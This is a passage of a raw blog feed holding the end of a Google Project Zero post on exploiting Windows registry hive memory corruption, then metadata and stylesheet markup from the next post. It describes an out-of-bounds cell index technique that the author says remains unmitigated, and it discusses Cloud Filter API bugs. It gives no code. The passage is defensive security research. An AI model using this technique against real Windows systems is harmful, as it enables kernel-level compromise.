 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;To conclude this blog post, I would like to share some final thoughts regarding hive-based memory corruption vulnerabilities.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ormwWEjHLs-c24&quot; id=&quot;h.40equp9l777x&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c35 ormwWEjHLs-c14&quot;&gt;Exploit mitigations&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Th&lt;/span&gt;&lt;span&gt;e&lt;/span&gt;&lt;span&gt;&amp;nbsp;above exploit shows that out-of-bounds cell indexes in the registry are a powerful exploitation technique, whose main strength lies in its determinism.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Within a specific version of the operating system, a given OOB index will always result in references to the same fields of the _CMHIVE structure, which eliminates the need to use any probabilistic exploitation methods such as kernel pool spraying.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Of all the available hive memory corruption exploitation methods, I consider this one to be the most stable and practical.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Therefore, it should come as no surprise that &lt;/span&gt;&lt;span&gt;I would like Microsoft to mitigate this technique&lt;/span&gt;&lt;span&gt;&amp;nbsp;for the security of all Windows users.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I already emphasized this in my previous &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/05/the-windows-registry-adventure-7-attack-surface.html&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/05/the-windows-registry-adventure-7-attack-surface.html&quot;&gt;&amp;nbsp;#&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/05/the-windows-registry-adventure-7-attack-surface.html&quot;&gt;7&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but now the &lt;/span&gt;&lt;span&gt;benefit of this mitigation&lt;/span&gt;&lt;span&gt;&amp;nbsp;is even more apparent: since the cell index bounds check is already present in HvpReleaseCellPaged, moving it to HvpGetCellPaged should be completely neutral in terms of system performance, and it would fully prevent the use of OOB indexes for any malicious purposes.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I suggested this course of action in November 2023&lt;/span&gt;&lt;span&gt;, but it hasn&amp;#39;t been implemented&lt;/span&gt;&lt;span&gt;&amp;nbsp;by the vendor yet, so all the techniques described here still work at the time of publication.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ormwWEjHLs-c24&quot; id=&quot;h.jky0cjfcca17&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c35 ormwWEjHLs-c14&quot;&gt;False File Immutability&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;So far in this blog, we have mostly focused on a scenario where we can control the internal regf data of an active hive through memory corruption.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is certainly the most likely reason why someone would take control of registry structures, but not necessarily the only one.&lt;/span&gt;&lt;span&gt;&amp;nbsp;A&lt;/span&gt;&lt;span&gt;s I already mentioned in the previous posts&lt;/span&gt;&lt;span&gt;, Windows uses section objects and their corresponding section views to map hive files into memory.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This means that the mappings are backed by the corresponding files, and if any of them are ever evicted &lt;/span&gt;&lt;span&gt;from memory (&lt;/span&gt;&lt;span&gt;e.g., due to memory pressure in the system), they will be reloaded from disk the next time they are accessed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, it is crucial for system security to protect actively loaded hives from being simultaneously written to.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This guarantee is achieved in the CmpOpenHiveFile function through the ShareAccess argument passed to &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatefile&quot;&gt;ZwCreateFile&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which takes a value of 0 or at most FILE_SHARE_READ, but never FILE_SHARE_WRITE. This causes the &lt;/span&gt;&lt;span&gt;operating system&lt;/span&gt;&lt;span&gt;&amp;nbsp;to ensure that no application can open the file for writing as long as the handle remains open.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;As I write these words, the research titled &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://www.elastic.co/security-labs/false-file-immutability&quot;&gt;False File Immutability&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;published by Gabriel Landau in 2024, naturally comes to &lt;/span&gt;&lt;span&gt;my &lt;/span&gt;&lt;span&gt;mind.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;He effectively demonstrated that for files opened from remote network shares (e.g., via the SMB protocol), guarantees regarding their immutability may not be upheld in practice, as the local computer simply lacks physical control over it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, the registry implementation is generally prepared for this eventuality: for hives loaded from locations other than the system partition, the HIVE_FILE_PAGES_MUST_BE_KEPT_LOCAL and VIEW_MAP_MUST_BE_KEPT_LOCAL flags are used, as discussed in &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;&amp;nbsp;#&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;6&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These flags instruct the kernel to keep local copies of each memory page for such hives, never allowing them to be completely evicted and, as a result, having to be read again from remote storage.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Thus, &lt;/span&gt;&lt;span&gt;the &lt;/span&gt;&lt;span&gt;attack&lt;/span&gt;&lt;span&gt;&amp;nbsp;vector &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;seems to be correctly addressed.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;However, during my audit of the registry&amp;#39;s memory management implementation last year, I discovered two related vulnerabilities: &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451731&quot;&gt;CVE-2024-43452&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451734&quot;&gt;CVE-2024-49114&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The second one is particularly noteworthy because, by abusing the &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/&quot;&gt;Cloud Filter API&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;functionality and its &amp;quot;placeholder files&amp;quot;, it was possible to arbitrarily modify active hive files in the system, including those loaded from the C:\ drive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This completely bypassed the sharing access right checks and their associated security guarantees.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;With this type of issue, the hive corruption exploitation techniques can be used without any actual memory corruption&lt;/span&gt;&lt;span&gt;&amp;nbsp;taking place, by simply &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c21&quot;&gt;replacing&lt;/span&gt;&lt;span&gt;&amp;nbsp;the memory in question with controlled data. I believe that &lt;/span&gt;&lt;span&gt;vulnerabilities of this class can be a real &lt;/span&gt;&lt;span&gt;treat&lt;/span&gt;&lt;span&gt;&amp;nbsp;for bug hunters, and they are certainly worth remembering for the future.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ormwWEjHLs-c24&quot; id=&quot;h.g9u8n4pk9p0m&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c35 ormwWEjHLs-c14&quot;&gt;Conclusion&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Dear reader,&lt;/span&gt;&lt;span&gt;&amp;nbsp;i&lt;/span&gt;&lt;span&gt;f you&amp;#39;ve made it to the end of this blog post, and especially if you&amp;#39;ve read all the posts in this series, I&amp;#39;d like to sincerely congratulate you on your perseverance.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;&amp;#128578; Through these write ups, I hope I&amp;#39;ve managed to document as many implementation details of the registry as possible; details that might otherwise have never seen the light of day.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;My goal was to show how interesting and internally complex this mechanism is, and in particular, what an important role it plays in the security of Windows as a whole.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Thank you for joining me on this adventure, and see you next time!&lt;/span&gt;&lt;/p&gt;
  &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;</content><link rel='replies' type='application/atom+xml' href='https://googleprojectzero.blogspot.com/feeds/2741369537148127470/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='https://googleprojectzero.blogspot.com/2025/05/the-windows-registry-adventure-8-exploitation.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/2741369537148127470'/><link rel='self' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/2741369537148127470'/><link rel='alternate' type='text/html' href='https://googleprojectzero.blogspot.com/2025/05/the-windows-registry-adventure-8-exploitation.html' title='The Windows Registry Adventure #8: Practical exploitation of hive memory corruption'/><author><name>Google Project Zero</name><uri>http://www.blogger.com/profile/08975904405228580347</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2cnmRXF5pxU4eJk13OsumymAYXEqnnICfxVyIDcM5LyyV00On5OT-PDpfIxwUmrEwTt6m9ksAaDTYbKi08zTGXOjLfvFlRrAhGaATI2wq2TBL-yecg15_xe3UsXUOtgSoDXyywYB1J46EQv_cqP_kVMxkFMXtCGWA1-Iy3vsvgUmZFuCYUiQ5LoPTQ9c/s72-c/image5.png" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-4838136820032157985.post-2349998921347799378</id><published>2025-05-23T02:05:00.000-07:00</published><updated>2025-05-23T02:05:54.874-07:00</updated><title type='text'>The Windows Registry Adventure #7: Attack surface analysis</title><content type='html'>&lt;style type=&quot;text/css&quot;&gt;@import url(https://themes.googleusercontent.com/fonts/css?kit=MXVwpSGzOOhqOc5hUWJbBLizfYjsfH9XaeDpmRKYJN5bV0WvE1cEyAoIq5yYZlSc);.lst-kix_yc4eoxp4yku1-6&gt;li{counter-increment:lst-ctn-kix_yc4eoxp4yku1-6}.lst-kix_t6r6gechao92-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_t6r6gechao92-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_ujo5hq8owa7j-0{list-style-type:none}.lst-kix_t6r6gechao92-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_t6r6gechao92-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_ujo5hq8owa7j-1{list-style-type:none}ul.lst-kix_ujo5hq8owa7j-2{list-style-type:none}ul.lst-kix_ujo5hq8owa7j-3{list-style-type:none}ul.lst-kix_ujo5hq8owa7j-4{list-style-type:none}ul.lst-kix_ujo5hq8owa7j-5{list-style-type:none}ul.lst-kix_ujo5hq8owa7j-6{list-style-type:none}ul.lst-kix_ujo5hq8owa7j-7{list-style-type:none}ul.lst-kix_ujo5hq8owa7j-8{list-style-type:none}.lst-kix_t6r6gechao92-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_7hq8etk2vhxg-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_fdfj2vkv7eng-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_pkd7hbr03pq1-7&gt;li{counter-increment:lst-ctn-kix_pkd7hbr03pq1-7}.lst-kix_7hq8etk2vhxg-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ifz79q5u9s7z-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_fdfj2vkv7eng-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_7hq8etk2vhxg-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ifz79q5u9s7z-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_pipdk6l60rc8-8&gt;li{counter-increment:lst-ctn-kix_pipdk6l60rc8-8}.lst-kix_fdfj2vkv7eng-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ifz79q5u9s7z-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_rdq5wlyhqi2l-3.start{counter-reset:lst-ctn-kix_rdq5wlyhqi2l-3 0}.lst-kix_7hq8etk2vhxg-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ifz79q5u9s7z-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_hyye7g1opk7h-2{list-style-type:none}ol.lst-kix_hyye7g1opk7h-3{list-style-type:none}ol.lst-kix_hyye7g1opk7h-1{list-style-type:none}ol.lst-kix_hyye7g1opk7h-6{list-style-type:none}.lst-kix_7gh94rsyg3pc-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_7gh94rsyg3pc-8,lower-roman) &quot;. &quot;}ol.lst-kix_hyye7g1opk7h-7{list-style-type:none}ol.lst-kix_hyye7g1opk7h-4{list-style-type:none}.lst-kix_jxi7mn5ld7an-6&gt;li{counter-increment:lst-ctn-kix_jxi7mn5ld7an-6}ol.lst-kix_hyye7g1opk7h-5{list-style-type:none}.lst-kix_7gh94rsyg3pc-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_7gh94rsyg3pc-6,decimal) &quot;. &quot;}ol.lst-kix_hyye7g1opk7h-8{list-style-type:none}.lst-kix_7gh94rsyg3pc-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_7gh94rsyg3pc-2,lower-roman) &quot;. &quot;}.lst-kix_7gh94rsyg3pc-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_7gh94rsyg3pc-0,decimal) &quot;. &quot;}.lst-kix_7gh94rsyg3pc-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_7gh94rsyg3pc-4,lower-latin) &quot;. &quot;}ol.lst-kix_hyye7g1opk7h-7.start{counter-reset:lst-ctn-kix_hyye7g1opk7h-7 0}.lst-kix_v2df8br1ncnr-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_v2df8br1ncnr-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_v2df8br1ncnr-6&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_5jrz2mxy905c-6.start{counter-reset:lst-ctn-kix_5jrz2mxy905c-6 0}ul.lst-kix_yc4eoxp4yku1-0{list-style-type:none}.lst-kix_h5hx08hv18g-8&gt;li{counter-increment:lst-ctn-kix_h5hx08hv18g-8}.lst-kix_clvvz81j6xhb-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_pipdk6l60rc8-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pipdk6l60rc8-5,lower-roman) &quot;. &quot;}.lst-kix_pipdk6l60rc8-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pipdk6l60rc8-3,decimal) &quot;. &quot;}.lst-kix_ygp4aypqry7g-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_3l83jjwr6djn-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_clvvz81j6xhb-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ygp4aypqry7g-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_3l83jjwr6djn-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_82xwcoadaw1l-7{list-style-type:none}ul.lst-kix_82xwcoadaw1l-6{list-style-type:none}ul.lst-kix_82xwcoadaw1l-5{list-style-type:none}ul.lst-kix_82xwcoadaw1l-4{list-style-type:none}ul.lst-kix_82xwcoadaw1l-3{list-style-type:none}ul.lst-kix_82xwcoadaw1l-2{list-style-type:none}ul.lst-kix_82xwcoadaw1l-1{list-style-type:none}.lst-kix_clvvz81j6xhb-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_82xwcoadaw1l-0{list-style-type:none}.lst-kix_ygp4aypqry7g-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_3l83jjwr6djn-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_8n3didooap36-7.start{counter-reset:lst-ctn-kix_8n3didooap36-7 0}.lst-kix_pipdk6l60rc8-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pipdk6l60rc8-7,lower-latin) &quot;. &quot;}.lst-kix_ygp4aypqry7g-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_3l83jjwr6djn-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_clvvz81j6xhb-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_dnl50tn7ajrj-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_dnl50tn7ajrj-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_8n3didooap36-2&gt;li{counter-increment:lst-ctn-kix_8n3didooap36-2}.lst-kix_clvvz81j6xhb-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_dnl50tn7ajrj-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_7g0li9r3maw0-8.start{counter-reset:lst-ctn-kix_7g0li9r3maw0-8 0}.lst-kix_dnl50tn7ajrj-3&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_7g0li9r3maw0-1{list-style-type:none}ul.lst-kix_zf75tum0ttlq-8{list-style-type:none}ol.lst-kix_7g0li9r3maw0-2{list-style-type:none}.lst-kix_fdfj2vkv7eng-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_zf75tum0ttlq-7{list-style-type:none}ol.lst-kix_7g0li9r3maw0-3{list-style-type:none}ul.lst-kix_zf75tum0ttlq-6{list-style-type:none}.lst-kix_7g0li9r3maw0-0&gt;li{counter-increment:lst-ctn-kix_7g0li9r3maw0-0}ol.lst-kix_7g0li9r3maw0-4{list-style-type:none}.lst-kix_fdfj2vkv7eng-2&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_jxi7mn5ld7an-4.start{counter-reset:lst-ctn-kix_jxi7mn5ld7an-4 0}.lst-kix_pbw7k2omnys5-8&gt;li{counter-increment:lst-ctn-kix_pbw7k2omnys5-8}ol.lst-kix_7g0li9r3maw0-0{list-style-type:none}ul.lst-kix_zf75tum0ttlq-1{list-style-type:none}ul.lst-kix_zf75tum0ttlq-0{list-style-type:none}ul.lst-kix_zf75tum0ttlq-5{list-style-type:none}ol.lst-kix_7g0li9r3maw0-5{list-style-type:none}ol.lst-kix_ho9g9u9fgt2w-1.start{counter-reset:lst-ctn-kix_ho9g9u9fgt2w-1 0}ul.lst-kix_zf75tum0ttlq-4{list-style-type:none}ol.lst-kix_7g0li9r3maw0-6{list-style-type:none}ul.lst-kix_zf75tum0ttlq-3{list-style-type:none}ol.lst-kix_7g0li9r3maw0-7{list-style-type:none}ul.lst-kix_zf75tum0ttlq-2{list-style-type:none}ol.lst-kix_7g0li9r3maw0-8{list-style-type:none}.lst-kix_7g0li9r3maw0-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_7g0li9r3maw0-7,lower-latin) &quot;. &quot;}ul.lst-kix_82xwcoadaw1l-8{list-style-type:none}.lst-kix_ho9g9u9fgt2w-7&gt;li{counter-increment:lst-ctn-kix_ho9g9u9fgt2w-7}.lst-kix_2a1s98goatwb-6&gt;li{counter-increment:lst-ctn-kix_2a1s98goatwb-6}.lst-kix_gpt6d7glhte-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_48bktl3sehd-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_mg4z5bas7rnx-0{list-style-type:none}.lst-kix_5jrz2mxy905c-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_5jrz2mxy905c-4,lower-latin) &quot;. &quot;}.lst-kix_gpt6d7glhte-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_mg4z5bas7rnx-4{list-style-type:none}ol.lst-kix_pkd7hbr03pq1-2.start{counter-reset:lst-ctn-kix_pkd7hbr03pq1-2 0}ul.lst-kix_mg4z5bas7rnx-3{list-style-type:none}ul.lst-kix_mg4z5bas7rnx-2{list-style-type:none}ul.lst-kix_mg4z5bas7rnx-1{list-style-type:none}ul.lst-kix_mg4z5bas7rnx-8{list-style-type:none}.lst-kix_5jrz2mxy905c-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_5jrz2mxy905c-8,lower-roman) &quot;. &quot;}ul.lst-kix_mg4z5bas7rnx-7{list-style-type:none}ul.lst-kix_mg4z5bas7rnx-6{list-style-type:none}ul.lst-kix_mg4z5bas7rnx-5{list-style-type:none}.lst-kix_48bktl3sehd-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_2ymhwgkcn4n-7.start{counter-reset:lst-ctn-kix_2ymhwgkcn4n-7 0}ul.lst-kix_lnv8dxxow5z5-0{list-style-type:none}.lst-kix_7g0li9r3maw0-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_7g0li9r3maw0-3,decimal) &quot;. &quot;}ul.lst-kix_lnv8dxxow5z5-1{list-style-type:none}ul.lst-kix_lnv8dxxow5z5-2{list-style-type:none}.lst-kix_rdq5wlyhqi2l-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rdq5wlyhqi2l-4,lower-latin) &quot;. &quot;}ul.lst-kix_lnv8dxxow5z5-3{list-style-type:none}ul.lst-kix_lnv8dxxow5z5-4{list-style-type:none}ul.lst-kix_lnv8dxxow5z5-5{list-style-type:none}ul.lst-kix_lnv8dxxow5z5-6{list-style-type:none}.lst-kix_h5hx08hv18g-1&gt;li{counter-increment:lst-ctn-kix_h5hx08hv18g-1}ul.lst-kix_lnv8dxxow5z5-7{list-style-type:none}ul.lst-kix_lnv8dxxow5z5-8{list-style-type:none}.lst-kix_rdq5wlyhqi2l-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rdq5wlyhqi2l-8,lower-roman) &quot;. &quot;}ol.lst-kix_2a1s98goatwb-3.start{counter-reset:lst-ctn-kix_2a1s98goatwb-3 0}ol.lst-kix_yc4eoxp4yku1-8.start{counter-reset:lst-ctn-kix_yc4eoxp4yku1-8 0}.lst-kix_5jrz2mxy905c-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_iwewjqe0yso6-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_2a1s98goatwb-8&gt;li{counter-increment:lst-ctn-kix_2a1s98goatwb-8}ol.lst-kix_h5hx08hv18g-4.start{counter-reset:lst-ctn-kix_h5hx08hv18g-4 0}.lst-kix_7g0li9r3maw0-7&gt;li{counter-increment:lst-ctn-kix_7g0li9r3maw0-7}.lst-kix_m392is15i0yl-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_m392is15i0yl-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_bb177mxms8kw-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_bb177mxms8kw-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_rdq5wlyhqi2l-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rdq5wlyhqi2l-0,decimal) &quot;. &quot;}ul.lst-kix_ay8c6zydp6wo-0{list-style-type:none}ul.lst-kix_xq6rarus8xqa-8{list-style-type:none}.lst-kix_zf75tum0ttlq-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_zf75tum0ttlq-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_2ymhwgkcn4n-2.start{counter-reset:lst-ctn-kix_2ymhwgkcn4n-2 0}ul.lst-kix_xq6rarus8xqa-7{list-style-type:none}ul.lst-kix_xq6rarus8xqa-6{list-style-type:none}ul.lst-kix_xq6rarus8xqa-5{list-style-type:none}ul.lst-kix_xq6rarus8xqa-4{list-style-type:none}ul.lst-kix_xq6rarus8xqa-3{list-style-type:none}ul.lst-kix_efugpt5gt85e-8{list-style-type:none}ul.lst-kix_xq6rarus8xqa-2{list-style-type:none}ul.lst-kix_xq6rarus8xqa-1{list-style-type:none}ul.lst-kix_efugpt5gt85e-6{list-style-type:none}ul.lst-kix_xq6rarus8xqa-0{list-style-type:none}ul.lst-kix_efugpt5gt85e-7{list-style-type:none}ul.lst-kix_efugpt5gt85e-4{list-style-type:none}ul.lst-kix_efugpt5gt85e-5{list-style-type:none}.lst-kix_pipdk6l60rc8-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pipdk6l60rc8-1,lower-latin) &quot;. &quot;}ul.lst-kix_sdl0l5x6yq8f-4{list-style-type:none}ul.lst-kix_sdl0l5x6yq8f-3{list-style-type:none}ul.lst-kix_sdl0l5x6yq8f-6{list-style-type:none}.lst-kix_ho9g9u9fgt2w-5&gt;li{counter-increment:lst-ctn-kix_ho9g9u9fgt2w-5}ul.lst-kix_sdl0l5x6yq8f-5{list-style-type:none}ul.lst-kix_sdl0l5x6yq8f-0{list-style-type:none}ul.lst-kix_sdl0l5x6yq8f-2{list-style-type:none}ul.lst-kix_sdl0l5x6yq8f-1{list-style-type:none}ul.lst-kix_ay8c6zydp6wo-5{list-style-type:none}ul.lst-kix_ay8c6zydp6wo-6{list-style-type:none}ul.lst-kix_ay8c6zydp6wo-7{list-style-type:none}ul.lst-kix_ay8c6zydp6wo-8{list-style-type:none}ul.lst-kix_ay8c6zydp6wo-1{list-style-type:none}ul.lst-kix_sdl0l5x6yq8f-8{list-style-type:none}ol.lst-kix_7g0li9r3maw0-3.start{counter-reset:lst-ctn-kix_7g0li9r3maw0-3 0}ul.lst-kix_ay8c6zydp6wo-2{list-style-type:none}ul.lst-kix_sdl0l5x6yq8f-7{list-style-type:none}ul.lst-kix_ay8c6zydp6wo-3{list-style-type:none}ul.lst-kix_ay8c6zydp6wo-4{list-style-type:none}ul.lst-kix_efugpt5gt85e-2{list-style-type:none}ul.lst-kix_efugpt5gt85e-3{list-style-type:none}ul.lst-kix_efugpt5gt85e-0{list-style-type:none}ul.lst-kix_efugpt5gt85e-1{list-style-type:none}.lst-kix_7gh94rsyg3pc-4&gt;li{counter-increment:lst-ctn-kix_7gh94rsyg3pc-4}.lst-kix_x1n37nye8y6i-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_x1n37nye8y6i-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_137rha48dom7-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_137rha48dom7-6,decimal) &quot;. &quot;}.lst-kix_b0yx1r9fgw53-7&gt;li:before{content:&quot;\0025cb   